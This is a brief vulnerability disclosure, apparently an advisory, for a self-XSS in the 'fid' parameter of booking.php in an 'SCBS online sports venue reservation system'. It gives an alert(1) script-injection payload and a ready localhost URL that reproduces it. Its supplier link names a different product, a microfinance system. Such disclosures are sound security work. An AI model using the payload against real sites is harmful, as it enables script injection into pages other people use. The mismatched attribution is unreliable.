# SCBS online sports venue reservation system v1.0 - Self-XSS

The 'fid' parameter can be controlled and output on HTML

Supplier:https://www.sourcecodester.com/php/14822/microfinance-management-system.html

Payload:```"><script>alert(1)</script>script>```

/booking.php has selfxss injection

Open:```http://localhost/scbs/booking.php?fid="><script>alert(1)</script>script>```

![7](/img/xss.png)

![8](/img/8.png)

